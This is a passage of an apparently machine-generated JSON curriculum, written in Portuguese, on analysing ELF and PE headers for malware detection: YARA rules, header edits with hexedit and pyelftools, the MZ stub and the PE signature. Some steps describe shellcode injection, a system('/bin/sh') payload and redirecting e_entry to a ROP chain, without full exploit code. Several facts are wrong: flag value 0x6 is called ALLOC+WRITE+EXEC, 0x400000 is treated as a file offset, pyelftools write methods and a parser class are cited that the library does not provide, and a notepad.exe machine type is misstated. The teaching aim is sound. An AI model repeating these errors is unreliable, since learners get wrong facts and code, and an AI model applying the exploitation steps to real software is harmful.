                                  "title": "Validar Detecções e Integrar com Ferramentas de Análise",
                                  "subSteps": [
                                    "Integre detecções com YARA rules para headers manipulados",
                                    "Use Volatility ou Rekall para análise de memória pós-infecção simulada",
                                    "Crie um checklist de verificações para headers ELF em pipelines automatizados",
                                    "Compare achados com IOCs de relatórios como Practical Malware Analysis",
                                    "Pratique em amostras reais de malware ELF (de repositórios como VirusShare em VM)"
                                  ],
                                  "verification": "Desenvolva e teste uma regra YARA que detecta SHF_WRITE em .text",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "YARA tool",
                                    "Amostras de malware ELF (VM segura)",
                                    "Ghidra ou IDA Free para validação"
                                  ],
                                  "learningObjective": "Automatizar e validar detecções de manipulações para análise escalável",
                                  "commonMistakes": [
                                    "Regras YARA muito genéricas gerando falsos positivos",
                                    "Não testar em múltiplas arquiteturas",
                                    "Esquecer de relatar contexto de threat actor"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário ELF malicioso simulado baseado no Lab 10-3 de Practical Malware Analysis, detecte SHF_WRITE ativado na seção .text (offset 0x400000), permitindo shellcode injection via buffer overflow em uma função vulnerável; use readelf -S para confirmar flags 0x6 (ALLOC+WRITE+EXEC) e radare2 para disassemblar o payload injetado que chama system('/bin/sh').",
                              "finalVerifications": [
                                "Lista todas as flags padrão e anômalas para PT_LOAD e .text corretamente",
                                "Detecta W^X violations em pelo menos 3 amostras ELF modificadas",
                                "Simula e relata buffer overflow com shellcode em relatório com evidências",
                                "Cria YARA rule funcional que acerta manipulações sem falsos positivos em benignos",
                                "Explica riscos de manipulações para bypass de ASLR/DEP",
                                "Valida detecções comparando com benchmarks de Practical Malware Analysis"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de flags inválidas (90%+ acurácia)",
                                "Qualidade do relatório com saídas de ferramentas e screenshots",
                                "Criatividade na simulação de cenários realistas de malware",
                                "Automação via scripts/YARA para detecção escalável",
                                "Compreensão de impactos em segurança (ex: ROP chains)",
                                "Integração com ferramentas RE sem erros operacionais"
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de memória e proteções (NX, W^X)",
                                "Programação em Assembly: Disassembly de shellcode injetado",
                                "Engenharia Reversa: Uso de radare2/Ghidra para análise binária",
                                "Segurança de Rede: Detecção de payloads em tráfego de C2",
                                "Criptografia: Verificação de integridade de headers com hashes"
                              ],
                              "realWorldApplication": "Em centros de resposta a incidentes (SOCs), analistas usam essas detecções para identificar malware ELF em servidores Linux comprometidos por APTs como APT28, prevenindo persistência via shellcode e buffer overflows em aplicações como SSH daemons."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.3.3",
                            "name": "Simular carregamento ELF com headers modificados",
                            "description": "Modificar headers com editores hexadecimais ou scripts Python (usando pyelftools) e testar falhas no ld.so, entendendo impactos na execução e exploração.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar ambiente e analisar ELF original",
                                  "subSteps": [
                                    "Instale ferramentas essenciais: readelf, objdump, hexedit e pyelftools via pip.",
                                    "Compile ou baixe um binário ELF simples (ex: 'hello world' em C).",
                                    "Use readelf -h para inspecionar headers principais (e_ident, e_type, e_phoff, etc.).",
                                    "Use objdump -f para verificar formato e seções.",
                                    "Anote valores originais dos headers críticos para modificação posterior."
                                  ],
                                  "verification": "readelf -h exibe headers corretos sem erros e binário executa normalmente com './binary'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Linux VM ou WSL",
                                    "GCC para compilar sample",
                                    "readelf, objdump, hexedit, python3-pip"
                                  ],
                                  "tips": "Use um sample pequeno para evitar complexidade; documente dumps originais em arquivo texto.",
                                  "learningObjective": "Compreender estrutura de headers ELF e ferramentas de inspeção.",
                                  "commonMistakes": [
                                    "Não ativar ASLR ou permissões erradas",
                                    "Usar binário estático em vez de dinâmico",
                                    "Ignorar endianness little-endian"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Modificar headers manualmente com editor hexadecimal",
                                  "subSteps": [
                                    "Abra o binário com hexedit: hexedit binary.elf.",
                                    "Localize e modifique um header crítico, ex: altere e_phoff para 0x1000 (offset inválido).",
                                    "Salve a cópia modificada como binary_mod.hex.",
                                    "Verifique mudanças com readelf -h binary_mod.hex.",
                                    "Compare dumps antes/depois para confirmar precisão."
                                  ],
                                  "verification": "readelf -h mostra o campo modificado (ex: e_phoff alterado) sem corromper outros dados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "hexedit ou xxd",
                                    "Sample ELF original"
                                  ],
                                  "tips": "Trabalhe em cópia; use busca hexadecimal para headers (ex: 7F 45 4C 46 para e_ident).",
                                  "learningObjective": "Dominar edição manual de binários e impactos em estruturas binárias.",
                                  "commonMistakes": [
                                    "Alterar bytes errados desalinhando estrutura",
                                    "Não salvar em modo binário",
                                    "Modificações muito radicais causando detecção imediata"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Modificar headers programaticamente com pyelftools",
                                  "subSteps": [
                                    "Instale pyelftools: pip install pyelftools.",
                                    "Escreva script Python para ler ELF, modificar header (ex: elf.header['e_entry'] = 0xdeadbeef).",
                                    "Salve ELF modificado com elf.write(elf_mod_file).",
                                    "Execute script e verifique com readelf -h elf_mod.pyelf.",
                                    "Teste múltiplas modificações em loop para eficiência."
                                  ],
                                  "verification": "Script roda sem erros e readelf confirma alterações precisas nos headers.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Python 3",
                                    "pyelftools library"
                                  ],
                                  "tips": "Use ELFStructParser para parsing seguro; valide offsets antes de escrever.",
                                  "learningObjective": "Automatizar manipulação de ELF via scripting para escalabilidade.",
                                  "commonMistakes": [
                                    "Não alinhar valores (ex: usar int em vez de u32)",
                                    "Escrever sem stream.close()",
                                    "Ignorar validações de pyelftools"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar carregamento e analisar falhas no ld.so",
                                  "subSteps": [
                                    "Execute binário modificado: LD_DEBUG=all ./binary_mod para logs detalhados.",
                                    "Observe falhas no dynamic linker (ld.so): segfault, 'invalid ELF header', etc.",
                                    "Use gdb para attach e analisar crash: gdb --args ./binary_mod.",
                                    "Examine stack trace e registradores para impacto (ex: jump para endereço inválido).",
                                    "Documente erros específicos e correlações com modificações."
                                  ],
                                  "verification": "ld.so gera erros reproduzíveis relacionados à modificação (ex: 'ELF load failed').",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "gdb",
                                    "strace para syscalls",
                                    "LD_DEBUG env var"
                                  ],
                                  "tips": "Desative ASLR com setarch -R; compare com strace original vs modificado.",
                                  "learningObjective": "Interpretar falhas de carregamento e mapear para headers específicos.",
                                  "commonMistakes": [
                                    "Executar como root ignorando proteções",
                                    "Não usar LD_DEBUG para verbose",
                                    "Confundir falhas de runtime com load-time"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar impactos e simular cenários de exploração",
                                  "subSteps": [
                                    "Correlacione modificações com comportamentos: ex: e_phnum=0 causa falta de PT_LOAD.",
                                    "Teste bypass de validações alterando e_ident[EI_CLASS].",
                                    "Simule exploração: modifique e_entry para ROP chain simples.",
                                    "Registre potenciais vetores (DoS em loaders, info leak).",
                                    "Crie relatório com screenshots de erros e análises."
                                  ],
                                  "verification": "Relatório explica 3+ impactos distintos com evidências de testes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Notepad ou Markdown para relatório",
                                    "Screenshots de gdb/readelf"
                                  ],
                                  "tips": "Foque em headers como PT_DYNAMIC para ld.so falhas; pense em ASLR bypass.",
                                  "learningObjective": "Entender implicações de segurança em carregadores ELF.",
                                  "commonMistakes": [
                                    "Superficial análise sem correlação",
                                    "Ignorar diferenças arch (x86/arm)",
                                    "Não considerar mitigações modernas como RELRO"
                                  ]
                                }
                              ],
                              "practicalExample": "Modifique e_phoff para 0xFFFFFFFF em um ELF dinâmico; ao executar com LD_DEBUG=libs, ld.so falha com 'file too short' ao mapear program headers, demonstrando validação de offset e potencial DoS em loaders vulneráveis.",
                              "finalVerifications": [
                                "Binário modificado via hex e Python carrega com erros específicos no ld.so.",
                                "Logs de LD_DEBUG e gdb traces correlacionam falhas aos headers alterados.",
                                "Relatório documenta pelo menos 3 modificações e seus impactos.",
                                "Execução original permanece intacta para baseline.",
                                "Script Python reusável para futuras mods.",
                                "Identificados vetores de exploração realistas."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas modificações de headers (sem corrupção acidental).",
                                "Interpretação correta de erros ld.so e gdb.",
                                "Cobertura de múltiplos métodos (hex + Python).",
                                "Análise profunda de impactos na execução.",
                                "Relatório claro com evidências visuais.",
                                "Tempo respeitado e substeps completos."
                              ],
                              "crossCurricularConnections": [
                                "Programação Python (pyelftools para parsing binário).",
                                "Sistemas Operacionais (dynamic linking e loaders).",
                                "Arquitetura de Computadores (endianness, offsets em binários).",
                                "Debugging e Ferramentas (gdb, strace).",
                                "Segurança de Software (reverse engineering basics)."
                              ],
                              "realWorldApplication": "Em pentesting e análise de malware, simular ELF malformados testa robustez de loaders em SOs embedded/IoT; útil para desenvolver detecções em AVs ou exploits em binários customizados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.4",
                    "name": "Estrutura Geral do Formato PE",
                    "description": "Organização básica do PE, com MS-DOS stub, PE header e optional header para executáveis Windows.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.4.1",
                        "name": "MS-DOS Stub",
                        "description": "Parte inicial do arquivo PE que garante compatibilidade com executáveis MS-DOS, contendo uma assinatura 'MZ' e um ponteiro para o cabeçalho PE real.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.1.1",
                            "name": "Identificar a assinatura MZ",
                            "description": "Localizar e interpretar os bytes iniciais '4D 5A' (MZ) no início do arquivo PE usando ferramentas como hex editor ou leitor de binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de ferramentas para análise hexadecimal",
                                  "subSteps": [
                                    "Baixe e instale um hex editor gratuito como HxD, Hex Fiend ou use online como hexed.it",
                                    "Verifique se o editor suporta visualização em hexadecimal e ASCII simultaneamente",
                                    "Familiarize-se com a interface: localize painéis de offset, hex bytes e ASCII",
                                    "Teste abrindo um arquivo de texto simples para praticar navegação",
                                    "Configure preferências para destacar bytes iniciais ou padrões específicos"
                                  ],
                                  "verification": "Ambiente pronto quando o hex editor abre sem erros e você consegue navegar por um arquivo teste",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Hex editor (HxD recomendado)",
                                    "Computador com Windows/Linux/Mac"
                                  ],
                                  "tips": "Use editores portáteis para evitar instalações desnecessárias",
                                  "learningObjective": "Preparar ferramentas essenciais para inspeção de binários",
                                  "commonMistakes": [
                                    "Escolher editores que não suportam grandes binários",
                                    "Ignorar visualização ASCII para interpretação rápida"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Obter e preparar um arquivo PE de exemplo",
                                  "subSteps": [
                                    "Localize um executável Windows legítimo, como notepad.exe (C:\\Windows\\System32\\notepad.exe)",
                                    "Copie o arquivo para uma pasta de trabalho para evitar modificações acidentais",
                                    "Confirme que é um arquivo PE usando 'file' no Linux ou 'sigcheck' no Windows",
                                    "Anote metadados do arquivo: tamanho, data de criação e hash MD5 para referência",
                                    "Crie uma cópia backup nomeada com timestamp"
                                  ],
                                  "verification": "Arquivo copiado e metadados anotados corretamente",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Executável PE exemplo (notepad.exe)",
                                    "Ferramenta file ou sigcheck"
                                  ],
                                  "tips": "Use arquivos do sistema para legitimidade; evite downloads suspeitos inicialmente",
                                  "learningObjective": "Selecionar amostras seguras e documentar contexto",
                                  "commonMistakes": [
                                    "Usar arquivos maliciosos sem sandbox",
                                    "Não fazer backup antes da análise"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Abrir o arquivo e localizar os bytes iniciais MZ",
                                  "subSteps": [
                                    "Abra o arquivo PE no hex editor",
                                    "Navegue para o offset 0x00 (início do arquivo)",
                                    "Identifique os dois primeiros bytes: devem ser 4D (M) seguido de 5A (Z)",
                                    "Compare com tabela ASCII: 4D=77='M', 5A=90='Z'",
                                    "Anote o offset exato e capture screenshot dos bytes"
                                  ],
                                  "verification": "Bytes iniciais confirmados como 4D 5A no offset 0",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Hex editor aberto",
                                    "Arquivo PE preparado",
                                    "Tabela ASCII/hex"
                                  ],
                                  "tips": "Use busca por 'MZ' se o editor suportar para confirmação rápida",
                                  "learningObjective": "Ler e interpretar bytes hexadecimais no cabeçalho",
                                  "commonMistakes": [
                                    "Confundir little-endian com big-endian",
                                    "Ler bytes errados por scroll acidental"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e validar a assinatura MZ",
                                  "subSteps": [
                                    "Confirme que MZ indica MS-DOS Stub no formato PE",
                                    "Localize o próximo campo relevante: offset para cabeçalho PE (geralmente em 0x3C)",
                                    "Teste em outro arquivo PE para consistência",
                                    "Documente achados em relatório: bytes, offset, implicações",
                                    "Experimente alterar MZ manualmente e observe falhas no executável"
                                  ],
                                  "verification": "Relatório escrito confirmando MZ em múltiplos arquivos e entendimento do propósito",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Múltiplos arquivos PE",
                                    "Editor de texto para relatório"
                                  ],
                                  "tips": "Valide com 'peid' ou 'detect-it-easy' para correlação",
                                  "learningObjective": "Compreender o papel da assinatura MZ na estrutura PE",
                                  "commonMistakes": [
                                    "Assumir todos os .exe começam com MZ (nem sempre)",
                                    "Não testar variação para aprendizado"
                                  ]
                                }
                              ],
                              "practicalExample": "Abra notepad.exe no HxD: os primeiros bytes são 4D 5A, confirmando o MS-DOS Stub. Altere para 4D 4D e tente executar: falha, provando a importância da assinatura.",
                              "finalVerifications": [
                                "Identifica corretamente 4D 5A como MZ no offset 0 de qualquer PE",
                                "Explica o propósito do MS-DOS Stub para compatibilidade DOS",
                                "Valida assinatura em pelo menos 3 arquivos PE diferentes",
                                "Documenta bytes com screenshot e offsets precisos",
                                "Reconhece ausência de MZ como indicador de formato não-PE"
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização dos bytes (100% correto)",
                                "Explicação clara do significado MZ (profunda vs superficial)",
                                "Uso correto de ferramentas sem erros operacionais",
                                "Análise em múltiplas amostras com consistência",
                                "Relatório estruturado com evidências visuais"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entender headers em linguagens como C para packing executáveis",
                                "Criptografia: Reconhecer padrões em análise de malware criptografado",
                                "Redes: Identificar PE em tráfego de downloads suspeitos",
                                "Sistemas Operacionais: Compatibilidade legacy DOS-Windows"
                              ],
                              "realWorldApplication": "Em segurança cibernética, identificar MZ ajuda na triagem rápida de malware PE, reverse engineering de binários e detecção de packing/obfuscation em amostras maliciosas durante incident response."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.2",
                            "name": "Ler o offset para o PE Header",
                            "description": "Extrair o valor no offset 0x3C (4 bytes) que aponta para o início do cabeçalho PE e validar sua posição no arquivo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e carregar o arquivo PE",
                                  "subSteps": [
                                    "Instale um editor hexadecimal como HxD ou use Python com bibliotecas como struct e binascii.",
                                    "Baixe um executável PE válido, como notepad.exe do Windows.",
                                    "Abra o arquivo no editor hex ou carregue em Python com open('file.exe', 'rb').",
                                    "Confirme o tamanho do arquivo para garantir que offset 0x3C seja acessível (geralmente > 0x3C).",
                                    "Anote o caminho completo do arquivo para referência."
                                  ],
                                  "verification": "Arquivo aberto corretamente e offset 0x3C visível no editor ou legível via código sem erros.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Editor hex (HxD, 010 Editor), Python 3+, executável PE de exemplo (notepad.exe)",
                                  "tips": "Use arquivos PE de 32/64 bits padrão para evitar complicações iniciais.",
                                  "learningObjective": "Configurar ferramentas para inspeção binária segura e eficiente.",
                                  "commonMistakes": "Abrir arquivo corrompido ou em modo texto em vez de binário, causando leituras inválidas."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e ler os 4 bytes no offset 0x3C",
                                  "subSteps": [
                                    "Navegue exatamente para o offset 0x3C (60 em decimal) no editor hex.",
                                    "Selecione os próximos 4 bytes (little-endian: bytes 60-63).",
                                    "Em Python: f.seek(0x3C); pe_offset_bytes = f.read(4).",
                                    "Converta os bytes para inteiro: struct.unpack('<I', pe_offset_bytes)[0].",
                                    "Registre o valor decimal/hexadecimal obtido (ex: 0x80 ou 128)."
                                  ],
                                  "verification": "Valor lido corretamente como uint32 little-endian, sem erros de conversão.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Editor hex ou script Python com import struct, binascii",
                                  "tips": "Lembre-se: PE é little-endian; inverta bytes manualmente se necessário para visualização.",
                                  "learningObjective": "Extrair dados precisos de offsets fixos em binários.",
                                  "commonMistakes": "Ler big-endian em vez de little-endian, resultando em offset incorreto (ex: 0xF0EB0000 em vez de 0x80)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar o offset e validar sua posição no arquivo",
                                  "subSteps": [
                                    "Compare o offset lido (ex: 0x80) com o tamanho total do arquivo.",
                                    "Garanta que offset + tamanho mínimo do PE Header (~0x18) não exceda o arquivo.",
                                    "Navegue para o offset calculado e inspecione os primeiros bytes.",
                                    "Verifique se inicia com 'PE\\0\\0' (0x50 45 00 00 em hex).",
                                    "Calcule distância: deve estar após MS-DOS stub (tipicamente 0x40-0x100 bytes)."
                                  ],
                                  "verification": "Offset aponta para bytes válidos 'PE\\0\\0' e está dentro dos limites do arquivo.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Editor hex, calculadora hex/decimal (online ou Python)",
                                  "tips": "Offsets típicos: 0x80-0x200; valores <64 ou > arquivo indicam corrupção.",
                                  "learningObjective": "Validar integridade de estruturas binárias por offsets relativos.",
                                  "commonMistakes": "Ignorar validação de bounds, levando a crashes ou leituras inválidas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Confirmar e documentar o início do PE Header",
                                  "subSteps": [
                                    "Leia os próximos campos após signature: Machine (2 bytes), NumberOfSections (2 bytes).",
                                    "Anote valores: ex: Machine=0x014C (x86), confirme coerência.",
                                    "Salve screenshot ou exporte log do offset e signature.",
                                    "Teste em outro PE para consistência (ex: calc.exe).",
                                    "Documente em relatório: 'PE Header em offset 0x80, signature confirmada.'"
                                  ],
                                  "verification": "PE Header signature e campos iniciais corretos; documentação completa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Editor hex, notepad para relatório, múltiplos PE samples",
                                  "tips": "Automatize com script Python para reutilização em análises futuras.",
                                  "learningObjective": "Integrar leitura de offset com verificação contextual do header.",
                                  "commonMistakes": "Confundir com outros offsets (ex: 0x3C com e_lfanew em COFF, mas é o mesmo)."
                                }
                              ],
                              "practicalExample": "Em notepad.exe (Windows 10, ~1MB): offset 0x3C contém 0x80 (little-endian: 80 00 00 00). Navegando para 0x80, encontra 'PE\\0\\0' seguido de Machine=0x014C (x86). Validação: arquivo size >0x100, signature exata.",
                              "finalVerifications": [
                                "Offset 0x3C lido como uint32 little-endian corretamente.",
                                "Offset aponta para 'PE\\0\\0' (0x50450000).",
                                "Offset + 4 < tamanho do arquivo.",
                                "Campos iniciais do PE Header (Machine, Sections) coerentes com PE padrão.",
                                "Processo repetido em 2+ arquivos PE sem erros.",
                                "Relatório documenta valores exatos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na leitura little-endian (sem inversão de bytes).",
                                "Validação completa de bounds e signature.",
                                "Uso correto de ferramentas sem erros de parsing.",
                                "Documentação clara com valores hex/decimal.",
                                "Aplicação consistente em múltiplos samples.",
                                "Identificação de anomalias (ex: offset inválido em malware)."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de struct.pack/unpack em Python/C para binários.",
                                "Sistemas Operacionais: Entender loaders de executáveis Windows.",
                                "Matemática: Conversões hex/binário e aritmética de ponteiros.",
                                "Segurança: Base para detecção de packing/obfuscation em malware."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar PE Header permite unpacking, extração de imports e detecção de injeções; essencial para ferramentas como PEiD, CFF Explorer ou IDA Pro em reverse engineering."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.3",
                            "name": "Entender o propósito do stub",
                            "description": "Explicar como o stub exibe uma mensagem de incompatibilidade em MS-DOS e transita para o código PE em Windows.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o contexto histórico do MS-DOS Stub",
                                  "subSteps": [
                                    "Pesquisar a evolução dos sistemas operacionais MS-DOS e Windows.",
                                    "Identificar a necessidade de compatibilidade retroativa nos executáveis PE.",
                                    "Explicar o papel do stub como 'cabeçalho' para ambientes DOS.",
                                    "Ler documentação oficial da Microsoft sobre formatos PE.",
                                    "Anotar razões para a inclusão obrigatória do stub em arquivos PE."
                                  ],
                                  "verification": "Resumir em 3 frases o porquê do stub existir, citando fontes históricas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Microsoft PE/COFF",
                                    "Artigos sobre história do Windows",
                                    "Navegador web"
                                  ],
                                  "tips": "Comece pela página da Wikipedia sobre PE format para visão geral rápida.",
                                  "learningObjective": "Entender as motivações históricas e de compatibilidade do MS-DOS Stub.",
                                  "commonMistakes": [
                                    "Confundir stub com o cabeçalho PE completo",
                                    "Ignorar o aspecto de compatibilidade DOS"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Examinar a estrutura interna do MS-DOS Stub",
                                  "subSteps": [
                                    "Abrir um executável PE em um editor hexadecimal (ex: HxD).",
                                    "Localizar o cabeçalho DOS (assinatura MZ nos primeiros bytes).",
                                    "Identificar a mensagem padrão 'This program cannot be run in DOS mode'.",
                                    "Analisar o ponteiro para o cabeçalho PE (offset 0x3C).",
                                    "Desmontar o stub com ferramenta como IDA Pro ou Ghidra."
                                  ],
                                  "verification": "Apontar o offset exato do ponteiro PE e copiar a string da mensagem de erro.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor hex: HxD ou 010 Editor",
                                    "Exemplo de EXE PE (ex: notepad.exe)",
                                    "Ghidra ou IDA Free"
                                  ],
                                  "tips": "Use busca por 'This program' para localizar rapidamente a mensagem.",
                                  "learningObjective": "Mapear os componentes anatômicos do stub e seu conteúdo.",
                                  "commonMistakes": [
                                    "Não diferenciar bytes do stub dos do PE",
                                    "Interpretar código stub como PE diretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o comportamento em ambiente MS-DOS",
                                  "subSteps": [
                                    "Executar o EXE PE em emulador DOSBox ou PCem.",
                                    "Observar a exibição da mensagem de incompatibilidade.",
                                    "Desmontar e debugar o stub para ver o fluxo até int 21h (saída de string).",
                                    "Modificar a mensagem no hex editor e testar a mudança.",
                                    "Comparar com executáveis nativos DOS para contrastar."
                                  ],
                                  "verification": "Gravar vídeo ou screenshot da mensagem exibida no DOSBox.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "DOSBox ou PCem",
                                    "EXE PE modificável",
                                    "Debugger DOS como DEBUG.COM"
                                  ],
                                  "tips": "Aumente a tela do DOSBox para capturar a mensagem claramente.",
                                  "learningObjective": "Simular e validar o propósito de rejeição em DOS.",
                                  "commonMistakes": [
                                    "Executar em Windows moderno sem emulador",
                                    "Não modificar para testar"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar a transição para o código PE em Windows",
                                  "subSteps": [
                                    "Examinar o código assembly do stub que salta para o loader PE.",
                                    "Seguir o ponteiro em 0x3C até o cabeçalho PE (PE\\x00\\x00).",
                                    "Usar debugger como x64dbg para ver o loader Windows ignorar o stub.",
                                    "Comparar fluxos: DOS (print e exit) vs Windows (jump to PE).",
                                    "Testar remoção do stub e impacto na execução Windows."
                                  ],
                                  "verification": "Traçar o jump assembly do stub para PE e documentar offsets.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "x64dbg ou WinDbg",
                                    "EXE PE original",
                                    "Editor hex"
                                  ],
                                  "tips": "Coloque breakpoint no offset 0x3C para ver o loader acessar.",
                                  "learningObjective": "Compreender o mecanismo de transição suave para Windows.",
                                  "commonMistakes": [
                                    "Assumir que Windows executa o stub",
                                    "Remover stub sem backup"
                                  ]
                                }
                              ],
                              "practicalExample": "Baixe notepad.exe (Windows nativo), abra em HxD: veja 'MZ' no início e mensagem DOS em ~0x80. Rode no DOSBox: vê 'This program cannot be run in DOS mode'. No Windows Debugger, veja jump direto para PE loader após stub.",
                              "finalVerifications": [
                                "Explicar verbalmente o ciclo completo: DOS rejeição vs Windows transição.",
                                "Modificar mensagem do stub e confirmar exibição alterada no DOSBox.",
                                "Identificar corretamente ponteiro PE em 3 EXEs diferentes.",
                                "Desmontar stub e apontar instrução de jump para PE.",
                                "Diferenciar stub de outros cabeçalhos em diagrama.",
                                "Testar EXE sem stub em Windows (deve falhar)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de offsets e strings do stub (90%+).",
                                "Correta simulação de comportamentos DOS e Windows.",
                                "Explicação clara do propósito histórico e técnico.",
                                "Uso correto de ferramentas sem erros graves.",
                                "Criatividade em modificações e testes práticos.",
                                "Conexão lógica entre passos no relatório final."
                              ],
                              "crossCurricularConnections": [
                                "História da Computação: Evolução DOS para Windows.",
                                "Programação Assembly: Análise de código de baixo nível.",
                                "Segurança da Informação: Detecção de malwares em PE stubs modificados.",
                                "Engenharia Reversa: Ferramentas como Ghidra para binários."
                              ],
                              "realWorldApplication": "Em análise forense digital, identificam stubs modificados em malwares para evasão de detecção DOS-based; reversão de engenharia de binários Windows para auditoria de segurança."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.2",
                        "name": "PE Header (Signature e COFF File Header)",
                        "description": "Cabeçalho principal do PE, iniciando com a assinatura 'PE\\0\\0' seguida do COFF File Header, que descreve características como arquitetura e número de seções.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.2.1",
                            "name": "Validar a assinatura PE",
                            "description": "Confirmar os bytes '50 45 00 00' (PE\\0\\0) no offset indicado pelo MS-DOS stub para autenticação do formato PE.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar o MS-DOS Stub no arquivo PE",
                                  "subSteps": [
                                    "Abra o arquivo executável PE em um editor hexadecimal (ex: HxD ou xxd).",
                                    "Identifique o cabeçalho MS-DOS inicial, começando com a assinatura 'MZ' (bytes 4D 5A nos offsets 0x00-0x01).",
                                    "Procure pelo campo 'e_lfanew' no offset 0x3C (4 bytes little-endian), que indica o offset relativo para o PE header.",
                                    "Anote o valor decimal do offset e converta para hexadecimal para navegação precisa.",
                                    "Verifique se o stub MS-DOS está intacto, sem truncamentos ou modificações suspeitas."
                                  ],
                                  "verification": "Confirme a presença de 'MZ' no início e um valor válido em e_lfanew (tipicamente entre 0x80 e 0x400).",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor hexadecimal (HxD, ImHex ou xxd no Linux)",
                                    "Amostra de arquivo PE válido (ex: notepad.exe)"
                                  ],
                                  "tips": "Use busca por 'MZ' para confirmar; offsets são sempre little-endian em PE.",
                                  "learningObjective": "Compreender a estrutura inicial do formato PE e o papel do MS-DOS stub como ponte para o header PE.",
                                  "commonMistakes": [
                                    "Confundir big-endian com little-endian ao ler e_lfanew",
                                    "Ignorar arquivos corrompidos sem 'MZ'",
                                    "Ler offset errado (sempre 0x3C)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Calcular e Navegar para o Offset do PE Header",
                                  "subSteps": [
                                    "Converta o valor de e_lfanew de hexadecimal para decimal se necessário.",
                                    "Navegue exatamente para o offset indicado por e_lfanew no editor hex.",
                                    "Visualize os primeiros 4 bytes nesse offset; eles devem ser a assinatura PE.",
                                    "Registre o offset exato e o contexto circundante para análise.",
                                    "Compare com documentação oficial da Microsoft para PE (ex: offsets esperados)."
                                  ],
                                  "verification": "O cursor está posicionado corretamente no offset e os bytes iniciais são visíveis.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Editor hexadecimal",
                                    "Documentação PE (pecoff_v08.xlsx ou MSDN)",
                                    "Calculadora hexadecimal (built-in no editor)"
                                  ],
                                  "tips": "Offsets são relativos ao início do arquivo; teste com múltiplas amostras PE.",
                                  "learningObjective": "Dominar o cálculo preciso de offsets em binários PE usando e_lfanew.",
                                  "commonMistakes": [
                                    "Adicionar offset base incorreto",
                                    "Ler e_lfanew como big-endian",
                                    "Navegar para offset absoluto em vez de relativo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Ler e Comparar a Assinatura PE",
                                  "subSteps": [
                                    "Extraia os 4 bytes no offset do PE header: posição 0 (relativa ao header).",
                                    "Converta os bytes hexadecimais para ASCII: 50='P', 45='E', 00=\\0, 00=\\0.",
                                    "Compare byte a byte: 50 45 00 00 deve matching exato.",
